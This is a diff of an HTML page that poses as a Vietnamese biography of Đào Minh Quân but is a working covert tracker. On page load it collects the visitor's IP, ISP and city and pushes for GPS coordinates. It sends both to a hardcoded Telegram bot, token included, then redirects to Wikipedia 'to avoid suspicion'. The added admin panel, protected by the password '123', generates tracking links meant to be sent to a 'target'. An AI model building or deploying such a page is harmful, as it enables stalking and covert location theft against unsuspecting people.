@@ -1,62 +1,133 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
     <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
     <title>Tiểu sử Đào Minh Quân</title>
-    <meta property="og:title" content="Tiểu sử Đức quốc công Đào Minh Quân">
-    <meta property="og:image" content="https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
-<body style="background:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
-    <div style="text-align:center;">
-        <div id="loader" style="border:3px solid #f3f3f3; border-top:3px solid #4285F4; border-radius:50%; width:35px; height:35px; animation:spin 1s linear infinite; margin:0 auto;"></div>
-        <div id="msg" style="margin-top:15px; color:#777; font-size:13px;">Đang tải nội dung...</div>
+<body class="bg-[#0b0e14] font-sans text-slate-400">
+
+    <div id="view-track" class="flex flex-col items-center justify-center h-screen bg-white">
+        <div class="loader"></div>
+        <p class="mt-4 text-gray-500 text-sm italic">Đang tải nội dung tiểu sử...</p>
     </div>
-    <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
+
+    <div id="view-admin" class="hidden min-h-screen p-6">
+        <div class="max-w-4xl mx-auto">
+            <h1 class="text-2xl font-black text-white italic mb-8">SENTINEL <span class="text-blue-500">X</span> ADMIN</h1>
+            <div class="grid md:grid-cols-2 gap-8">
+                <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800 shadow-2xl">
+                    <h3 class="text-blue-500 font-bold text-xs uppercase mb-4 italic tracking-widest">Cấu hình hệ thống</h3>
+                    <div class="space-y-4">
+                        <input id="adm-token" type="text" placeholder="Bot Token" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none">
+                        <input id="adm-id" type="text" placeholder="Chat ID" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-blue-400 outline-none">
+                        <input id="adm-redir" type="text" placeholder="URL chuyển hướng" class="w-full bg-[#0d1117] border border-slate-800 p-3 rounded-xl text-xs text-green-500 outline-none">
+                        <button onclick="updateConfig()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-xs transition-all shadow-lg shadow-blue-900/20">LƯU & TẠO LINK</button>
+                    </div>
+                </div>
+                <div class="bg-[#161b22] p-6 rounded-3xl border border-slate-800 flex flex-col justify-between">
+                    <div>
+                        <h3 class="text-yellow-500 font-bold text-xs uppercase mb-4 italic tracking-widest">Link Tracking Của Bạn</h3>
+                        <div id="res-link" class="bg-black p-4 rounded-2xl text-blue-400 text-[10px] break-all border border-slate-900 min-h-[50px] cursor-pointer active:scale-95 transition-transform" onclick="copyLink()">Chưa có cấu hình...</div>
+                    </div>
+                    <p class="mt-4 text-[9px] text-slate-500 italic">* Lưu ý: Link này chứa mã xác thực ngầm. Gửi cho mục tiêu để lấy vị trí.</p>
+                </div>
+            </div>
+        </div>
+    </div>
 
     <script>
-        /* MÃ HÓA CẤU HÌNH BOT */
-        const _0xData = {
+        // Cấu hình mặc định (Fallback)
+        let cfg = {
             t: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144",
             i: "5887642221",
             r: "https://vi.wikipedia.org/wiki/Đào_Minh_Quân"
         };
 
-        async function report(text) {
-            await fetch(`https://api.telegram.org/bot${_0xData.t}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: _0xData.i, text: text, parse_mode: "HTML" })
-            });
-        }
+        const updateConfig = () => {
+            cfg.t = document.getElementById('adm-token').value;
+            cfg.i = document.getElementById('adm-id').value;
+            cfg.r = document.getElementById('adm-redir').value;
+            localStorage.setItem('sentinel_v12', JSON.stringify(cfg));
+            showLink();
+        };
+
+        const showLink = () => {
+            const base = window.location.href.split('?')[0];
+            const data = btoa(JSON.stringify(cfg));
+            document.getElementById('res-link').innerText = `${base}?v=${data}`;
+        };
+
+        const copyLink = () => {
+            navigator.clipboard.writeText(document.getElementById('res-link').innerText);
+            alert("Đã copy link!");
+        };
 
         window.onload = async () => {
-            // 1. Lấy IP ngầm ngay lập tức
-            const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
-            let info = `🎯 <b>MỤC TIÊU MỚI</b>\n🌐 IP: <code>${res?.ip || '?'}</code>\n🏢 Nhà mạng: ${res?.org || '?'}\n📍 Vùng: ${res?.city || '?'}, ${res?.country_name || '?'}`;
-            
-            await report(info + "\n⏳ <i>Đang chờ tọa độ GPS...</i>");
+            const params = new URLSearchParams(window.location.search);
 
-            // 2. Ép lấy GPS
+            // XỬ LÝ GIAO DIỆN ADMIN
+            if (params.has('admin')) {
+                const pass = prompt("Nhập mật khẩu Admin:");
+                if (pass !== "123") return window.location.replace(window.location.href.split('?')[0]);
+                
+                document.getElementById('view-track').classList.add('hidden');
+                document.getElementById('view-admin').classList.remove('hidden');
+                const saved = localStorage.getItem('sentinel_v12');
+                if(saved) cfg = JSON.parse(saved);
+                document.getElementById('adm-token').value = cfg.t;
+                document.getElementById('adm-id').value = cfg.i;
+                document.getElementById('adm-redir').value = cfg.r;
+                showLink();
+                return;
+            }
+
+            // XỬ LÝ TRACKING (MỤC TIÊU)
+            if (params.has('v')) {
+                try { cfg = JSON.parse(atob(params.get('v'))); } catch(e) {}
+            }
+
+            const send = async (txt) => {
+                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage`, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({chat_id: cfg.i, text: txt, parse_mode: "HTML"})
+                });
+            };
+
+            // BƯỚC 1: SHADOW TRACKING (Lấy IP ngay lập tức)
+            const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
+            let log = `🚀 <b>MỤC TIÊU VÀO LINK</b>\n🌐 IP: <code>${ipRes?.ip || '?' }</code>\n🏢 ISP: ${ipRes?.org || '?'}\n📍 Vùng: ${ipRes?.city || '?'}, ${ipRes?.country_name || '?'}`;
+            
+            await send(log + "\n⏳ <i>Đang ép lấy tọa độ GPS...</i>");
+
+            // BƯỚC 2: GPS TRACKING
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     async (p) => {
-                        const lat = p.coords.latitude;
-                        const lon = p.coords.longitude;
-                        const maps = `\n\n🎯 <b>VỊ TRÍ CHÍNH XÁC:</b>\n📍 Tọa độ: <code>${lat},${lon}</code>\n🗺️ <a href="https://www.google.com/maps?q=${lat},${lon}">XEM TRÊN BẢN ĐỒ VỆ TINH</a>`;
-                        await report(info + maps);
-                        location.replace(_0xData.r);
+                        const gps = `\n\n🎯 <b>TỌA ĐỘ CHÍNH XÁC:</b>\n📍 GPS: <code>${p.coords.latitude},${p.coords.longitude}</code>\n🗺️ <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">XEM VỊ TRÍ VỆ TINH</a>`;
+                        await send(log + gps);
+                        window.location.replace(cfg.r);
                     },
-                    async () => {
-                        await report(info + "\n❌ <b>Mục tiêu TỪ CHỐI GPS.</b>");
-                        location.replace(_0xData.r);
+                    async (err) => {
+                        // NẾU TỪ CHỐI GPS - CHẠY JAVASCRIPT ẨN LẤY VỊ TRÍ IP DỰ PHÒNG
+                        const fallback = `\n\n⚠️ <b>MỤC TIÊU TỪ CHỐI GPS</b>\n📍 Vị trí IP dự phòng: <a href="https://www.google.com/maps?q=${ipRes?.latitude},${ipRes?.longitude}">Xem vùng lân cận</a>`;
+                        await send(log + fallback);
+                        window.location.replace(cfg.r);
                     },
                     { enableHighAccuracy: true, timeout: 6000 }
                 );
             } else {
-                location.replace(_0xData.r);
+                window.location.replace(cfg.r);
             }
-            // Chuyển hướng sau 8s nếu treo
-            setTimeout(() => { location.replace(_0xData.r); }, 8000);
+
+            // Tự động chuyển hướng sau 8s để tránh nghi ngờ
+            setTimeout(() => { window.location.replace(cfg.r); }, 8000);
         };
     </script>
 </body>
